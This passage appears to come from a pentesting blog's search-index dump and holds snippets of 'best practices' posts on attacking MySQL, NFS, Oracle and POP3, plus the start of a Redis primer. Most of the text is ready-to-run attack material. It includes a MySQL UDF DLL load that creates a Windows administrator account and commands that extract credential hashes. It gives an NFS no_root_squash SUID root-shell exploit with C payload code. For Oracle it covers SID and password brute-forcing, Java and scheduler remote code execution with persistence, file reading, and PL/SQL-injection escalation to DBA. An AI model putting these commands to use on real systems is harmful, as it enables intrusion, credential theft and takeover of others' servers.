npn(line blob);INSERT INTO npn values(load_files('C://temp//lib_mysqludf_sys.dll'));SELECT * FROM mysql.npn INTO DUMPFILE 'c://windows//system32//lib_mysqludf_sys_32.dll';CREATE FUNCTION sys_exec RETURNS integer SONAME 'lib_mysqludf_sys_32.dll';SELECT sys_exec(\"net user npn npn12345678 /add\");SELECT sys_exec(\"net localgroup Administrators npn /add\");Extracting MySQL credentials from the databaseSELECT User,Host,Password FROM mysql.user;SELECT User,Host,authentication_string FROM mysql.user;mysql -u root --password=&lt;PASSWORD&gt; -e \"SELECT User,Host,authentication_string FROM mysql.user;\"Extracting MySQL credentials from filesInside /etc/mysql/debian.cnf you can find the plain-text password of the user debian-sys-maintcat /etc/mysql/debian.cnfYou can use these credentials to login in the mysql database.Inside the file: /var/lib/mysql/mysql/user.MYD you can find all the hashes of the MySQL users (the ones that you can extract from mysql.user inside the database).You can extract them doing:grep -oaE \"[-_\\.\\*a-Z0-9]{3,}\" /var/lib/mysql/mysql/user.MYD | grep -v \"mysql_native_password\"Enabling loggingYou can enable logging of mysql queries inside /etc/mysql/my.cnf uncommenting the following lines:Useful Fileswindows config.ini my.ini windows\\my.ini winnt\\my.ini /mysql/data/ unix my.cnf /etc/my.cnf /etc/mysql/my.cnf /var/lib/mysql/my.cnf ~/.my.cnf /etc/my.cnf Command History ~/.mysql.historyLog Files connections.log update.log common.log" }, { "title": "NFS Pentesting Best Practices", "url": "/posts/nfs-pentesting-best-practicies/", "categories": "pentesting protocols, nfs", "tags": "pentesting, nfs, best practicies", "date": "2022-06-12 00:00:00 +0300", "snippet": "NFS NFS usually uses ports 111, 2049What is NFS?NFS (Network FileSysem) is a very stable and powerful file system for sharing storage devices of UNIX/Linux operating systems. Thanks to NFS; The same files can be accessed from multiple computers. It provides convenience in data storage. Instead of installing to the local disk for each application, it allows applications to be shared.PORT STATE SERVICE VERSION2049/tcp open nfs NFS Pentesting Shodan search query : port:2049 Misconfigured NFSA lot of data is obtained in file sharing in most of the companies that are tested for network penetration.NFS Service Detection in Network with Nmapnmap -n -PN -sS -T5 -p 2049 --script=nfs-showmount 10.10.x.x/24nmap --script=nfs-ls.nse,nfs-showmount.nse,nfs-statfs.nse -p 2049 10.10.x.xNetwork NFS Service Detection with Metasploitmsf &gt; use auxiliary/scanner/nfs/nfsmountmsf auxiliary(nfsmount) &gt; set RHOSTS 10.10.x.x/24msf auxiliary(nfsmount) &gt; runNFS Shares Listing With “showmount”showmount -e 10.10.x.xAccess to discovered NFS sharesmount -t nfs 10.10.x.x:/export/home /mnt/connect_pathmount -t nfs -o vers=2 10.10.x.x:/export/home /mnt/connect_path -o nolock # You should specify to use version 2 because it doesn't have any authentication or authorization.Access to discovered NFS shares with same user UID PermissionsIn the terminal we can see the shared arguments and what UID value they belong to a user.-rwxr----- 1923 1000 1898 example.docWe see that there is a document. But we may need to open this doc file with a user with an authorized user UID. First of all, let’s unmount the mount we mounted with the unmount command. Then let’s create a user with the same UID value in the local system.umount /connect_pathYes, we have unmounted. Now let’s create a user with the same UID value.useradd newusersetting the user UID valueusermod -u 1923 newuserConnecting the share to the local system again after setting the UID value.mount -t nfs 192.168.x.x:/export/home /home/newuser/Desktop/connect_pathNFS no_root_squash/no_all_squash misconfiguration PERead the /etc/exports file, if you find some directory that is configured as no_root_squash, then you can access it from as a client and write inside that directory as if you were the local root of the machine.no_root_squash: This option basically gives authority to the root user on the client to access files on the NFS server as root. And this can lead to serious security implications.no_all_squash: This is similar to no_root_squash option but applies to non-root users. Imagine, you have a shell as nobody user; checked /etc/exports file; no_all_squash option is present; check /etc/passwd`{: .filepath} file; emulate a non-root user; create a suid file as that user (by mounting using nfs). Execute the suid as nobody user and become different user.Privilege EscalationRemote ExploitIf you have found this vulnerability, you can exploit it:Mounting that directory in a client machine, and as root copying inside the mounted folder the /bin/bash binary and giving it SUID rights, and executing from the victim machine that bash binary.#Attacker, as root usermkdir /tmp/pemount -t nfs &lt;IP&gt;:&lt;SHARED_FOLDER&gt; /tmp/pecd /tmp/pecp /bin/bash .chmod +s bash#Victimcd &lt;SHAREDD_FOLDER&gt;./bash -p #ROOT shellMounting that directory in a client machine, and as root copying inside the mounted folder our come compiled payload that will abuse the SUID permission, give to it SUID rights, and execute from the victim machine that binary (you can find here some C SUID payloads).//gcc payload.c -o payload#include &lt;stdio.h&gt;#include &lt;unistd.h&gt;#include &lt;sys/types.h&gt;int main(){ setuid(getuid()); system(\"/bin/bash\"); return 0;}" }, { "title": "ORACLE Pentesting Best Practices", "url": "/posts/oracle-pentesting-best-practices/", "categories": "pentesting protocols, oracle", "tags": "pentesting, oracle, best practicies", "date": "2022-06-11 00:00:00 +0300", "snippet": "ORACLE ORACLE default uses ports 1521, 1522, 1529What is ORACLE?Oracle database (Oracle DB) is a relational database management system (RDBMS) from the Oracle Corporation (from here).When enumerating Oracle the first step is to talk to the TNS-Listener that usually resides on the default port (1521/TCP, -you may also get secondary listeners on 1522–1529-).PORT STATE SERVICE VERSION1521/tcp open oracle-tns Oracle TNS Listener 9.2.0.1.0 (for 32-bit Windows)1748/tcp open oracle-tns Oracle TNS ListenerORACLE Pentesting Shodan search query : port:1521,1522,1529 Oracle Pentesting requirements installationInstallation of tools (sqlplus) and needed libraries to use the oracle MSF modules(This installation guide was created for version 12.1.0.1.0, change that name for the version that you download)As root, create the directory /opt/oracle.. Then download the Oracle Instant Client packages for your version of Kali Linux. The packages you will need are: instantclient-basic-linux-12.1.0.1.0.zip instantclient-sqlplus-linux-12.1.0.1.0.zip instantclient-sdk-linux-12.1.0.1.0.zipUnzip these under /opt/oracle, and you should now have a path called /opt/oracle/instantclient_12_1/. Next symlink the shared library that we need to access the library from oracle:ln libclntsh.so.12.1 libclntsh.sols -lh libclntsh.solrwxrwxrwx 1 root root 17 Jun 1 15:41 libclntsh.so -&gt; libclntsh.so.12.1ldconfigYou also need to configure the appropriate environment variables, add the following to either ~/.bashrc. /etc/profile.export PATH=$PATH:/opt/oracle/instantclient_12_1export SQLPATH=/opt/oracle/instantclient_12_1export TNS_ADMIN=/opt/oracle/instantclient_12_1export LD_LIBRARY_PATH=/opt/oracle/instantclient_12_1export ORACLE_HOME=/opt/oracle/instantclient_12_1Add Oracle libraries to ldconfig:echo \"/opt/oracle/instantclient_12_1/\" &gt;&gt; /etc/ld.so.conf.d/99_oracleIf you have succeeded, you should be able to run sqlplus from a command prompt (you may need to log out and log back in again):sqlplus &lt;username&gt;/&lt;password&gt;@&lt;ip_address&gt;/&lt;SID&gt;;Step Two — Install Ruby Gem ruby-oci8These steps are needed to use metasploit oracle modulesInstall other OS dependencies:apt-get install libgmp-devCompile and install ruby-oci8 (root)wget https://github.com/kubo/ruby-oci8/archive/ruby-oci8-2.1.8.zipunzip ruby-oci8-2.1.8.zipcd ruby-oci8-ruby-oci8-2.1.8/makemake installgem install ruby-oci8Restart msfconsole (or restart the machine).EnumerationTools that can be used for this are: nmap, MSF and tnscmd10g.TNS listener versionnmap --script \"oracle-tns-version\" -p 1521 -T4 -sV &lt;IP&gt;msf&gt; use auxiliary/scanner/oracle/tnslsnr_version#apt install tnscmd10gtnscmd10g version -p 1521 -h &lt;IP&gt;Other useful TNS listener commands: Command Purpose ping Ping the listener version Provide output of the listener version and platform information status Return the current status and variables used by the listener services Dump service data debug Dump debugging information to the listener log reload Reload the listener configuration file save_config Write the listener configuration file to a backup location stop Invoke listener shutdown If you receive an error, could be because TNS versions are incompatible (Use the --10G parameter with tnscmd10) and if the error persist, the listener may be password protected (you can see a list were all the errors are detailed here) — don’t worry… hydra to the rescue:hydra -P rockyou.txt -t 32 -s 1521 host.victim oracle-listenerThe TNS listener could be vulnerable to MitM attacks. Check here how to check if the server is vulnerable and how to perform the attack (all versions up to version 12c are).SID EnumerationWhat is a SID?The SID (Service Identifier) is essentially the database name, depending on the install you may have one or more default SIDs, or even a totally custom dba defined SID.In some old versions (in 9 it works) you could ask for the SID and the database send it to you:tnscmd10g status-p 1521 -h &lt;IP&gt; #The SID are inside: SERVICE=(SERVICE_NAME=&lt;SID_NAME&gt;)#msf1msf&gt; use auxiliary/scanner/oracle/sid_enummsf&gt; set rhost &lt;IP&gt;msf&gt; run#msf2msf&gt; use auxiliary/admin/oracle/tnscmdmsf&gt; set CMD (CONNECT_DATA=(COMMAND=STATUS))msf&gt; set rhost &lt;IP&gt;msf&gt; run #The SID are inside: SERVICE=(SERVICE_NAME=&lt;SID_NAME&gt;)If you cant access this way to the SIDs you will need to bruteforce them:SID BruteforceI have merged the nmap and MSF sid lists into this one (without duplicates):sids-oracle.txthydra -L /usr/share/metasploit-framework/data/wordlists/sid.txt -s 1521 &lt;IP&gt; oracle-sidpatator oracle_login host=&lt;IP&gt; sid=FILE0 0=sids-oracle.txt -x ignore:code=ORA-12505./odat.py sidguesser -s $SERVER -d $SID --sids-file=./sids.txtmsf&gt; use auxiliary/admin/oracle/sid_brute #This will use the list located at /usr/share/metasploit-framework/data/wordlists/sid.txtnmap --script +oracle-sid-brute -p 1521 10.11.1.202 #This will use the list lcated at /usr/share/nmap/nselib/data/oracle-sidsIn order to use oracle_login with patator you need to install:pip3 install cx_Oracle --upgradeTargeting AccountsGot SID? Excellent, now let’s move to the next task and extract the user account information. From this point, you can connect to the listener and brute-force credentials.Metasploit scanner/oracle/oracle_login It has a built-in dictionary for the most popular default values of user account information presented as login:password. By the way, such default entries represent one of the most popular and serious security problems in Oracle.Nmap can also help here with the script oracle-brute. Note that this script mixes the logins and passwords, that is, it tries each login against every password, and it takes quite a while!Default PasswordsBelow are some of the default passwords associated with Oracle:DBSNMP/DBSNMP - Intelligent Agent uses this to talk to the db server (its some work to change it)SYS/CHANGE_ON_INSTALL - Default sysdba account before and including Oracle v9, as of version 10g this has to be different!PCMS_SYS/PCMS_SYS - Default x accountWMSYS/WMSYS - Default x accountOUTLN/OUTLN - Default x accountSCOTT/TIGER - Default x accountOther default passwords can be found here and here.The versions 11.1.0.6, 11.1.0.7, 11.2.0.1, 11.2.0.2, and 11.2.0.3 are vulnerable to offline brute force.Remote Stealth Pass Brute ForceOuter Perimeter: Remote stealth pass brute forceThe versions 11.1.0.6, 11.1.0.7, 11.2.0.1, 11.2.0.2, and 11.2.0.3 are vulnerable to this technique. In order to understand the idea behind this vulnerability, you need to consider how the authentication protocol works with the database. I will show it for version 11. The interaction with the server proceeds as follows: The client connects to the server and sends the user name. The server generates a session identifier AUTH_SESSKEY and encrypts it by using AES-192. As its key, the system uses SHA-1 hash generated from user password and salt AUTH_VFR_DATA. The server sends an encrypted session ID and salt to the client. The client generates the key by hashing its password and received salt. The client uses this key to decrypt the session data received from the server. Based on decrypted server session ID, the client generates a new public key for future use.Now, here’s the most interesting part: The session ID AUTH_SESSKEY sent by the server to the client has a length of 48 bytes. Of these, 40 bytes are random, and the last 8 are the duplicates of 0x08. The initialization vector is 0x00 (Null).Knowing that the last 8 bytes of the public identifier always consist of 0x08, we can bruteforce this password and, moreover, do it in offline mode, which means a tremendous speed, especially if you use GPU. To mount an attack, you need to know SID, valid login (for example, SYS account is very interesting) and, of course, have the ability to connect to the database. In this case, there will be no records, such as Invalid Login Attempt, created in the Oracle audit logs!Summing it all up: Use Wireshark to intercept the initial traffic during authorization. This will be helped by tns filter. Extract HEX values for AUTH_SESSKEY, AUTH_VFR_DATA. Insert them into PoC script, which will perform a dictionary (brute force) attack.Using nmap and johnroot@kali:~# nmap -p1521 --script oracle-brute-stealth --script-args oracle-brute-stealth.sid=DB11g -n 10.10.x.xStarting Nmap 6.49BETA4 (https://nmap.org) at 2016-03-02 14:58 ESTNmap scan report for 10.10.x.xPORT STATE SERVICE1521/tcp open oracle| oracle-brute-stealth:| Accounts| SYS:$o5logon$1245C95384E15E7F0C893FCD1893D8E19078170867E892CE863330880E09FAD3B4832CBCFDAC1| A821D2EA8E3D2209DB6*4202444F49DE9AE72AE2 - | Hashed valid or invalid credentials| Statistics|_ Performed 211 guesses in 9 seconds, average tps: 20john hashes.txtUser/Pass bruteforceDifferent tools offered different user/pass lists for oracle:oscan: /usr/share/oscanner/accounts.default (169 lines)msf &gt; use admin/oracle/oracle_login # /usr/share/metasploit-framework/data/wordlists/oracle_default_passwords.csv (598 lines)msf &gt; use scanner/oracle/oracle_login # /usr/share/metasploit-framework/data/wordlists/oracle_default_userpass.txt (568 lines)nmap --script oracle-brute -p 1521 --script-args oracle-brute.sid=ORCL 10.10.x.xnmap --script oracle-brute-stealth -p 1521 --script-args oracle-brute-stealth.sid=ORCL 10.10.x.xnmap --script=oracle-sid-brute --script-args=oraclesids=/path/to/sidfile -p 1521-1560 10.10.x.xnmap -sT -p 1521 -d -Pn --script-trace --script oracle-brute --script-args \"oracle-brute.sid=orcl, brute.credfile=/usr/share/nmap/nselib/data/oracle-default-accounts.lst\" 10.10.x.x # /usr/share/nmap/nselib/data/oracle-default-accounts.lst (687 lines)I have mixed all of them and removed duplicates:users-oracle.txtpass-oracle.txtBrute ForceNow, that you know a valid SID and valid credentials. To connect to the database you need the tool: sqlpluspatator oracle_login sid=&lt;SID&gt; host=&lt;IP&gt; user=FILE0 password=FILE1 0=users-oracle.txt 1=pass-oracle.txt -x ignore:code=ORA-01017./odat.py passwordguesser -s $SERVER -d $SID./odat.py passwordguesser -s $MYSERVER -p $PORT --accounts-file accounts_multiple.txt#msf1msf&gt; use admin/oracle/oracle_loginmsf&gt; set RHOSTS &lt;IP&gt;msf&gt; set RPORT 1521msf&gt; set SID &lt;SID&gt;#msf2, this option uses nmap and it fails sometimes for some reasonmsf&gt; use scanner/oracle/oracle_loginmsf&gt; set RHOSTS &lt;IP&gt;msf&gt; set RPORTS 1521msf&gt; set SID &lt;SID&gt;#nmap fails sometimes for some reson executing this scriptnmap --script oracle-brute -p 1521 --script-args oracle-brute.sid=&lt;SID&gt; &lt;IP&gt;In order to use oracle_login with patator you need to install:pip3 install cx_Oracle --upgradeOffline OracleSQL hash bruteforce (versions 11.1.0.6, 11.1.0.7, 11.2.0.1, 11.2.0.2, and 11.2.0.3)To login using known credentials:sqlplus &lt;username&gt;/&lt;password&gt;@&lt;ip_address&gt;/&lt;SID&gt;;If the TNS Listener is on a non-default port (e.g. TCP/1522) :sqlplus &lt;username&gt;/&lt;password&gt;@&lt;ip_address&gt;:&lt;port&gt;/&lt;SID&gt;;If an account has system database priviledges (sysdba) or system operator (sysop) you may wish to try the following:sqlplus &lt;username&gt;/&lt;password&gt;@&lt;ip_address&gt;/&lt;SID&gt; 'as sysdba';#Example:sqlplus SYSTEM/MANAGER@192.168.0.2/ORCL 'as sysdba'All in OneAn interesting tool is oscanner, which will try to get some valid SID and then it will brute-force for valid credentials and try to extract some information:#apt install oscanneroscanner -s &lt;IP&gt; -P &lt;PORT&gt;Another tool that will do all of this it odat:git clone https://github.com/quentinhardy/odat.gitcd odat./odat.py --help #It shouldn't be problems in Kali./odat.py all -s &lt;IP&gt; -p &lt;PORT&gt;./odat.py all -s &lt;IP&gt; -p &lt;PORT&gt; -d &lt;SID&gt; #To bruteforce accounts for that SIDWith these options (-s and -p), ODAT will search valid SID (System ID) in a first step. You can configure some options for configuring methods (i.e. word-list or brute-force attack). By default, ODAT will use a big word list and it will do a small brute-force attack.If ODAT founds at least one SID (e.g. ORCL), it will search valid Oracle accounts. It will do that on each SID found. You can specify some options for credentials (e.g. --accounts-file, --accounts-files, --login-as-pwd).For each valid account (e.g. SYS) on each valid instance (SID), ODAT will return what each Oracle user can do (e.g. reverse shell, read files, become DBA).Wiki odatRemote Code ExecutionThere are at least two different ways to execute commands, such as by using Java procedures and DBMS_SCHEDULER package. By the way, you can also achieve RCE in case of SQL injection in a web application provided, of course, that the user running it has sufficient rights. At this stage, I highly recommend preparing the Oracle Database Attacking Tool: ODAT.Install ODATgit clone https://github.com/quentinhardy/odat.gitcd odat./odat.py #It shouldn't be problems in KaliExecute Code via Java Stored Procedure./odat.py java -s &lt;IP&gt; -U &lt;username&gt; -P &lt;password&gt; -d &lt;SID&gt; --exec COMMANDRCE: Java Store ProcedureSo, imagine that you have the administrator account information. In this case, a very popular way to execute your command on the server is to write a ‘java stored’ procedure. This is done in three stages. First, create a Java class called ‘oraexec’. To do this, connect via ‘sqlplus’ terminal and write:create or replace and resolve java source named \"oraexec\" asimport java.lang.*;import java.io.*; public class oraexec { public static void execCommand(String command) throws IOException { Runtime.getRuntime().exec(command); } }/Next, write a PL/SQL wrapper for this class:create or replace procedure javacmd(p_command varchar2) as language java name 'oraexec.execCommand(java.lang.String)'; /That’s it. Now, to execute a command, all you need is just to send the following query:exec javacmd('command');Note that when using the above procedure, we cannot see the results of executed command, however, you can redirect the output to a file and read it. You can find the full code of the shell that allows to read and write files:raptor_oraexec.sqlHowever, there is a more sophisticated script that handles the command output, but it has a larger size here.RCE: SchedulerThe next method, which will help us if there is no Java virtual machine, is to use ‘dbmsscheduler’, the built-in task scheduler of Oracle. To use it, you must have the privilege CREATE EXTERNAL JOB. Here’s a code sample that implements the entry of ‘0wned’ string into a text file in the root of the C: drive:exec DBMS_SCHEDULER.create_program('RDS2008','EXECUTABLE','c:\\ WINDOWS\\system32\\cmd.exe /c echo 0wned &amp;gt;&amp;gt; c:\\rds3.txt',0,TRUE);exec DBMS_SCHEDULER.create_job(job_name =&amp;gt; 'RDS2008JOB',program_name =&amp;gt; 'RDS2008',start_date =&amp;gt; NULL,repeat_interval =&amp;gt; NULL,end_date =&amp;gt; NULL,enabled =&amp;gt; TRUE,auto_drop =&amp;gt; TRUE);This will create and run a job for executing your command. And here’s an option for calling the Scheduler from another procedure – SYS.KUPP$PROC.CREATE_MASTER_PROCESS, which is of interest to us, primarily, because it allows you to embed multi-statement queries, that is, those consisting of multiple sub-queries. Theoretically, you can run such query even in case of injection into a web application.select SYS.KUPP$PROC.CREATE_MASTER_PROCESS('DBMS_SCHEDULER.create_program(''xxx'',''EXECUTABLE'',''cmd.exe /c echo qqq&amp;gt;&amp;gt;C:/scchh'',0,TRUE); DBMS_SCHEDULER.create_job(job_name=&amp;gt;''jobx'',program_name=&amp;gt;''xxx'',start_date=&amp;gt;NULL,repeat_interval=&amp;gt;NULL,end_date=&amp;gt;NULL,enabled=&amp;gt;TRUE,auto_drop=&amp;gt;TRUE);dbms_lock.sleep(1);dbms_scheduler.drop_program(program_name=&amp;gt;''xxx'');dbms_scheduler.purge_log;') from dualNote that, when you use the Scheduler, you can run this job more than once and do it with some frequency. As a result, this will help you get a foothold in the tested system, because, even if the administrator deletes the user from OS, this job, which is regularly running in the system, will bring him or her back to life.RCE: External TablesAs the last method for achieving the execution of OS commands, I would like to mention the use of External Tables. This method will help you later download files from the server. You will need the following privileges:UTL_FILE;CREATE TABLE;a directory reserved for the user.Let’s remember that the access to UTL_FILE package is by default provided to all accounts with CONNECT role.Step one: Check the issued directories with the following query:SELECT TABLE_NAME FROM ALL_TAB_PRIVS WHERE TABLE_NAME IN(SELECT OBJECT_NAME FROM ALL_OBJECTS WHERE OBJECT_TYPE='DIRECTORY')and privilege='EXECUTE' ORDER BY GRANTEE; TABLE_NAME------------------------------ALICE_DIRStep two: Create an executable batch file with desired command:declare f utl_file.file_type; s varchar2(200) := 'echo KOKOKO &amp;gt;&amp;gt; C:/pwned';begin f := utl_file.fopen('ALICE_DIR','test.bat','W'); utl_file.put_line(f,s); utl_file.fclose(f);end;/Step three: Prepare the external table EXTT, you will need it to run the file:CREATE TABLE EXTT (line varchar2(256))ORGANIZATION EXTERNAL(TYPE oracle_loader DEFAULT DIRECTORY ALICE_DIR ACCESS PARAMETERS ( RECORDS DELIMITED BY NEWLINE FIELDS TERMINATED BY ',') LOCATION (alice_dir:'test.bat'))/Now, just call your batch file with the following command:SELECT * from EXTT;The terminal will start to display error messages that the system cannot match the table and invoked file but, in this case, it is not important, as the main objective was to open the executable file, which you have achieved.ODAT.py utility also can implement this attack. However, it requires the privilege CREATE ANY DIRECTORY, which, by default, is granted only to DBA role, since it attempts to execute the file from any and not only “your” directory.Read/Write filesNow, let’s proceed to the task of reading and writing the files. If you simply need to read or write a file to the server, you can do it without any Java procedures, which, however, can also handle such tasks. Let’s have a look into UTL_FILE package that has the functionality required for working with the file system. The good news is that, by default, it can be accessed by all users with PUBLIC role. The bad news is that, by default, this procedure has no access to the entire file system, but only to a directory pre-defined by the administrator. However, it is not uncommon to find a directory parameter specified as *, which literally means “access to everything.” You can find this out by using the following command:select name, value from v$parameter where name = 'utl_file_dir';With appropriate rights, you can expand the access by using the following query:alter system set utl_file_dir='*' scope =spfile;I found that the shortest procedure for using UTL_FILE package is proposed by Alexander Polyakov:SET SERVEROUTPUT ONdeclaref utl_file.file_type;sBuffer Varchar(8000);beginf:=UTL_FILE.FOPEN (''C:/’,'boot.ini','r');loopUTL_FILE.GET_LINE (f,sBuffer);DBMS_OUTPUT.PUT_LINE(sBuffer);end loop;EXCEPTIONwhen no_data_found thenUTL_FILE.FCLOSE(f);end;/If you need more functionality with the ability to write, I recommend to google a script called raptor_oraexec.sql. And according to tradition, here’s an option for using ODAT utility, which, as always, is the shortest:./odat.py utlfile -s &lt;IP&gt; -d &lt;SID&gt; -U &lt;username&gt; -P &lt;password&gt; --getFile \"C:/test\" token.txt token.txtUTL_FILE package is also very interesting because if you’re lucky, you can reach the logs, configuration files and obtain passwords from privileged accounts, such as SYS.The second method that I would like to mention is to use again the External Tables. Remember that, when using External Tables, the database can access in read mode the data from external tables. For a hacker, this means yet another opportunity to download files from the server, but this method requires CREATE ANY DIRECTORY privilege. I suggest immediately using ODAT, as it is stable and fast:./odat.py externaltable -s &lt;IP&gt; -U &lt;username&gt; -P &lt;password&gt; -d &lt;SID&gt; --getFile \"C:/test\" \"my4.txt\" \"my\"Elevating PrivilegesYou can use various methods to elevate privileges, ranging from classic buffer overflows and DLL patching to specialized attacks against databases, such as PL/SQL injections. The topic is very extensive and, in this article, I will not dwell on it, as this is discussed in large research papers, such as those found in the blogs of Lichfield and Finnigan. I will just demonstrate some of them, so that you have a general idea. During the testing, I recommend simply paying attention to current privileges and, based on this, search for desired loopholes in the Internet.Unlike MS SQL, where an attacker can inject xp_cmdshell almost immediately after SELECT by simply closing it with a quotation mark, Oracle DB flatly rejects such tricks. For this reason, we cannot every time resort to classical SQL injections although, in this case, too, it is possible to find a way out. We will consider PL/SQL injections, which are modifying the process of executing a procedure (function, trigger, and other objects) by embedding random commands into available input parameters. (с) Sh2kerrIn order to embed the payload, find a function where the input parameters are not filtered. Remember that Oracle SQL does not allow multi-statement (multiple) queries, therefore, most likely, you will need to use some “special” procedures that have this feature. The main idea behind the attack is as follows: By default, unless specified otherwise, the procedure is executed on behalf of the owner and not on behalf of the user who started it. In other words, if a procedure owned by SYS account is available for execution and you can embed your code into it, your payload will also be executed in the context of SYS account. As I already mentioned, this is not what happens always, as there are procedures with ‘authid current_user’ parameter, which means that this procedure will be executed with privileges of the current user. However, usually in each version, you can find some functions that are vulnerable to PL/ SQL injection. A general view of this process is shown right there:In short, instead of expected legitimate argument, we pass some malicious code that becomes a part of procedure. A good example is provided by CTXSYS.DRILOAD function. It is executed on behalf of CTXSYS and does not filter the input parameter, which allows you to easily rise up to DBA:exec ctxsys.driload.validate_stmt('grant dba to scott');However, by now, this is probably history, since the vulnerability was found in 2004, and it affects only the old versions 8–9. Usually, the process of escalating the privileges is divided into two parts: writing the procedure that increases the rights and performing the injection itself. A typical procedure is as follows:CREATE OR REPLACE FUNCTION F1RETURN NUMBER AUTHID CURRENT_USERISPRAGMA AUTONOMOUS_TRANSACTION;BEGINEXECUTE IMMEDIATE 'GRANT DBA TO TEST';COMMIT;RETURN(1);END;/Now we can inject a procedure as an argument of vulnerable function (example for versions 10x):exec sys.kupw$WORKER.main('x','YY'' and 1=test1.f1 –-');In the not too recent versions 10 and 11, there is one nice exception, or rather a vulnerability, that allows you to execute commands on the server without having DBA rights: DBMS_JVM_EXP_PERMS procedure allows a user with CREATE SESSION privilege to get JAVA IO rights. The attack can be mounted as follows:SQL&amp;gt; DECLARE POL DBMS_JVM_EXP_PERMS.TEMP_JAVA_POLICY; CURSOR C1 IS SELECT'GRANT','GREMLIN','SYS','java.io.FilePermission','&amp;lt;FILES&amp;gt;&amp;gt;','execute','ENABLED' FROM DUAL; BEGIN OPEN C1; FETCH C1 BULK COLLECT INTO POL; CLOSE C1; DBMS_JVM_EXP_PERMS.IMPORT_JVM_PERMS(POL); END; / PL/SQL procedure successfully completed.Now that you have the privileges to call up Java procedures, you can evoke a response from the Windows interpreter and execute something:SQL&amp;gt; select dbms_java.runjava(‘oracle/aurora/util/Wrapper c:\\\\windows\\\\system32\\\\cmd.exe /c echo 123 &amp;gt;c:\\\\hack’)from dual;" }, { "title": "POP3 Pentesting Best Practices", "url": "/posts/pop3-pentesting-best-practices/", "categories": "pentesting protocols, pop3", "tags": "pentesting, pop3, best practicies", "date": "2022-06-10 00:00:00 +0300", "snippet": "POP3 POP3 usually uses ports 110, 995What is POP3?POP3 stands for Post Office Protocol. As the name suggests, it allows you to use your email inbox like a post office – emails are downloaded onto your computer and removed from the mail server.When accessing your emails using the POP3 protocol, a copy of the emails is created and stored locally on your computer. The originals are usually, but not always, removed from the mail server. In other words, emails are tied to the specific device. Once the email is downloaded onto one device (and removed from the mail server), it cannot be accessed by another email client or device.PORT STATE SERVICE VERSION110/tcp open pop3 Zimbra Collabration Suite pop3dPOP3 Pentesting Shodan search query : port:110, 995 EnumerationBanner Grabbingtelnet 10.10.x.x 110nc -nv 10.10.x.x 110nmap -p110 --script=banner 10.10.x.xnmap -p110 --script=pop3-ntlm-info 10.10.x.xmsf &gt; use auxiliary/scanner/pop3/pop3_version #MetasploitFrameworkopenssl s_client -connect &lt;IP&gt;:995 -crlf -quietCapabilities#All are default scriptsnmap --script \"pop3-capabilities or pop3-ntlm-info\" -sV -port 110 192.168.x.x# Retrieve POP3 server capabilities (CAPA, TOP, USER, SASL, RESP-CODES, LOGIN-DELAY, PIPELINING, EXPIRE, UIDL, IMPLEMENTATION) nmap -v -sV --version-intensity=5 --script pop3-capabilities -p T:110 192.168.x.xThe pop3-ntlm-info plugin will return some “sensitive” data (Windows versions).POP3 CommandsPOP commands: USER uid Log in as \"uid\" PASS password Substitue \"password\" for your actual password STAT List number of messages, total mailbox size LIST List messages and sizes RETR n Show message n DELE n Mark message n for deletion RSET Undo any changes QUIT Logout (expunges messages if no RSET) TOP msg n Show first n lines of message number msg CAPA Get capabilitiesCapturing POP3 Packagesmsf &gt; use auxiliary/server/capture/pop3 #MetasploitFrameworkPOP3 CredentialsAuthentication Checking (classical credentials) USER PASS admin admin root root root toor Brute Forcinghydra -l USERNAME -P /path/to/passwords.txt -f &lt;IP&gt; pop3 -Vhydra -S -v -l USERNAME -P /path/to/passwords.txt -s 995 -f &lt;IP&gt; pop3 -Vhydra -t 2 -L users.list -P passwords.list -M 10.10.x.x.list -s 110 pop3# Try to bruteforce POP3 accountsNmap: pop3-brute –script-args userdb=users.list,passdb=passwords.listnmap --script pop3-brute --script-args pop3loginmethod=SASL-LOGIN -p T:110 IPnmap --script pop3-brute --script-args pop3loginmethod=SASL-CRAM-MD5 -p T:110 IPnmap --script pop3-brute --script-args pop3loginmethod=APOP -p T:110 IPmsf &gt; use auxiliary/scanner/pop3/pop3_login #MetasploitFrameworkmedusa -t 2 -T 2 -U users.list -P passwords.list -H 10.10.x.x.list -n 110 -M pop3ncrack -g CL=2 -U users.list -P passwords.list -iL 10.10.x.x.list -p pop3:110 -oA outputpatator pop3_login host=10.10.x.x user=FILE1 password=FILE0 0=users.list 1=passwords.list -x ignore:fgrep=’incorrect password or account name’POP3 Vulnerabilities#Seattle Lab Mail 5.5 [CVE-2003-0264]msf &gt; use exploit/windows/pop3/seattlelab_pass #MetasploitFrameworkExploit-DB: 638.py, 643.c, 646.c#Cyrus – Gentoo 2006.0 Linux 2.6 [CVE-2006-2502]msf &gt; use exploit/linux/pop3/cyrus_pop3d_popsubfolders #MetasploitFramework" }, { "title": "Redis Pentesting Best Practices", "url": "/posts/redis-pentesting-best-practices/", "categories": "pentesting protocols, redis", "tags": "pentesting, redis, best practicies", "date": "2022-06-09 00:00:00 +0300", "snippet": "Redis Redis usually uses port 6379What is Redis?Redis is an open-source, in-memory data structure store used as a database, cache, and message broker. Redis was created by Salvatore Sanfilippo in 2006 and is written in C.It is a NoSQL advanced key-value data store, and is often referred to as a data structure server because its keys contain strings, hashes, lists, sets, sorted sets, bitmaps, and hyperloglogs. Redis’ read and write operations are very fast because it stores data in memory. Data can also be stored on the disk or written back to the memory.Since Redis stores its data in memory, it is most commonly used as a cache. Some large organizations that use Redis are Twitter, GitHub, Instagram, Pinterest, and Snapchat.PORT STATE SERVICE VERSION6379/tcp open redis Redis key-value store 4.0.11 (64 bits)Redis Data TypesRedis is a key-value store, but it supports many types of data structures as values other than strings. The key in Redis is a binary-safe string, with a max size of 512 MB.Let’s discuss the data types that are supported in values.StringA string in Redis is a sequence of bytes. They are binary safe, so they have a known length that is not determined by any terminating characters. You can store up to 512 megabytes in a Redis string. It can store any type of data, like text, integers, floats, videos, images, or audio files.redis 127.0.0.1:6379&gt; SET name \"educative\" OK redis 127.0.0.1:6379&gt; GET name \"educative\"In this example, SET and GET are Redis commands, which we will discuss later. name is the key, and educative is the string value that we are storing.ListIn Redis, lists are lists of strings that are sorted by an insertion order, so the elements are stored in a linked list. You can add elements to either on the head or tail. If we need to insert an element in a list with 500 records, then it will take the same amount of time as adding the element to a list of 50,000 records.Here are some examples operations for list the resulting lists:LPUSH mylist x # now the list is \"x\"LPUSH mylist y # now the list is \"y\",\"x\"RPUSH mylist z # now the list is \"y\",\"x\",\"z\" (RPUSH was used this time)SetsSets in Redis are unordered collections of strings. This value type is similar to List, but sets don’t allow for duplicates, and the elements 